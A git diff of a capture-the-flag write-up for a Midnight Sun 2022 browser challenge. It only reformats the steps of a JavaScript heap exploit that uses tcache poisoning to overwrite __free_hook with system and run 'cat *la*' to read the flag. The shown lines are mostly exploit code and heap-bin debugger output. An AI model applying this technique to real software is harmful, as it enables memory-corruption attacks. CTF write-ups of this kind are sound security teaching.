@@ -201,22 +201,22 @@ Many operations influence the heap layout and the bins. Using functions like `co
 <!-- [solve.py]({{ "/assets/code/csawquals21/ncore/solve.py" | relative_url }}). -->
 After a lot of tweaking, we developed working exploit ([pwn.js]({{ "/assets/code/midnightQuals22/hfs_browser/pwn.js" | relative_url }})):
 
-1. Alocate a chunk of size 0x1e0. We chose 0x1e0 since the Tcache was already populated, meaning we would not have problems with the chunk counter.
+#### 1. Alocate a chunk of size 0x1e0. We chose 0x1e0 since the Tcache was already populated, meaning we would not have problems with the chunk counter.
 
 ```js
 chunk = new Uint8Array(0x1e0);
 ```
-2. Free the chunk
+#### 2. Free the chunk
 
 ```js
 chunk.midnight();
 ```
-Tcache:
+
 ```
 Tcachebins[idx=29, size=0x1f0] count=2  ←  Chunk(addr=0x4c9a80, size=0x1f0, flags=PREV_INUSE)  ←  Chunk(addr=0x4c5960, size=0x1f0, flags=PREV_INUSE) 
 ```
 
-3. `chunk->fd = &__free_hook`
+#### 3. `chunk->fd = &__free_hook`
 
 ```js
 free_hook = libc_base + 0x1eee48;
@@ -229,26 +229,26 @@ chunk[2] = parseInt(free_hook_str.substring(6, 6 + 2), 16);
 chunk[1] = parseInt(free_hook_str.substring(8, 8 + 2), 16);
 chunk[0] = parseInt(free_hook_str.substring(10, 10 + 2), 16);
 ```
-Tcache:
+
 ```
 Tcachebins[idx=29, size=0x1f0] count=2  ←  Chunk(addr=0x4c9a70, size=0x1f0, flags=PREV_INUSE)  ←  Chunk(addr=0x7ffff7ddfe48, size=0x0, flags=! PREV_INUSE) 
 
 0x7ffff7ddfe48 = &__free_hook
 ```
 
-4. Allocate a chunk and write the command for `system`. `cat *la*` worked for our exploit.
+#### 4. Allocate a chunk and write the command for `system`. `cat *la*` worked for our exploit.
 
 ```js
 chunk2 = new Uint32Array(0x78);
 chunk2[1] = 0x2a616c2a; // *la*
 chunk2[0] = 0x20746163; // cat
 ```
-Tcache:
+
 ```
 Tcachebins[idx=29, size=0x1f0] count=1  ←  Chunk(addr=0x7ffff7ddfe48, size=0x0, flags=! PREV_INUSE) ...
 ```
 
-5. Allocate the final chunk. `malloc` will return `&__free_hook`
+#### 5. Allocate the final chunk. `malloc` will return `&__free_hook`
 
 ```js
 target = new Uint32Array(0x78);
@@ -256,7 +256,7 @@ target[0] = system;         // lower  32 bits of system
 target[1] = system_upper;   // higher 32 bits of system
 ```
 
-6. Free chunk2 containing `cat *la*`
+#### 6. Free chunk2 containing `cat *la*`
 
 ```js
 chunk2.midnight()
